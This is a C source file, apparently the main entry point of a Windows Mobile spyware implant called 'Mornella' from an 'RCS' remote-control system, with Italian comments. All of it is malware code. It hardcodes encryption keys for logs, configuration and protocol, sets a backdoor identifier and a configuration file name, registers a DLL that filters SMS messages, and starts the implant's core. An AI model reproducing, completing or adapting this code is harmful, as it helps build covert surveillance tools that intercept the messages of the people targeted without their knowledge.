// Mornella Static
#include "Core.h"
#include <stdio.h>

int WINAPI main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	Core core;

	// RCS 696 su rcs-preprod
	// RCS 696
	BYTE LogKey[] = { 0x14, 0x51, 0xfa, 0xce, 0x6d, 0x8a, 0x64, 0x30, 0xec, 0x1d, 0xd0, 0x8b, 0x3e, 0x56, 0x1f, 0xa1 };
	BYTE ConfKey[] = { 0x4d, 0xec, 0x7f, 0x03, 0x42, 0xdd, 0xce, 0xe8, 0x55, 0xee, 0x24, 0xf9, 0xd2, 0xc4, 0x82, 0x0b };
	// Sign sul DB
	BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };

	g_hInstance = hInstance;

	// Configurazione artificiale di alcune variabili
	ZeroMemory(g_AesKey, 32);
	ZeroMemory(g_Challenge, 32);
	ZeroMemory(g_ConfKey, 32);

	ZeroMemory(g_BackdoorID, 16);
	ZeroMemory(g_ConfName, 32 * sizeof(WCHAR));

	CopyMemory(g_AesKey, LogKey, 16);
	CopyMemory(g_Challenge, ProtoKey, 16);
	CopyMemory(g_ConfKey, ConfKey, 16);
	CopyMemory(g_BackdoorID, "RCS_0000000696", strlen("RCS_0000000xxx"));
	CopyMemory(g_ConfName, L"cptm511.dql", WideLen(L"cptm511.dql"));
	// Fine configurazione artificiale

	// Unregistriamo la DLL
	HMODULE hSmsFilter;

	// Installiamo la DLL del filtro SMS
	hSmsFilter = NULL;
	typedef HRESULT (*pRegister)();
	pRegister RegisterFunction;

	// Unregistriamo la DLL per il filtering degli SMS
	hSmsFilter = LoadLibrary(SMS_DLL);

	if (hSmsFilter != NULL) {
		RegisterFunction = (pRegister)GetProcAddress(hSmsFilter, L"DllRegisterServer");

		if (RegisterFunction != NULL) {
			RegisterFunction();
		}

		FreeLibrary(hSmsFilter);
	}
	//

	core.Run();

	return 0;
}
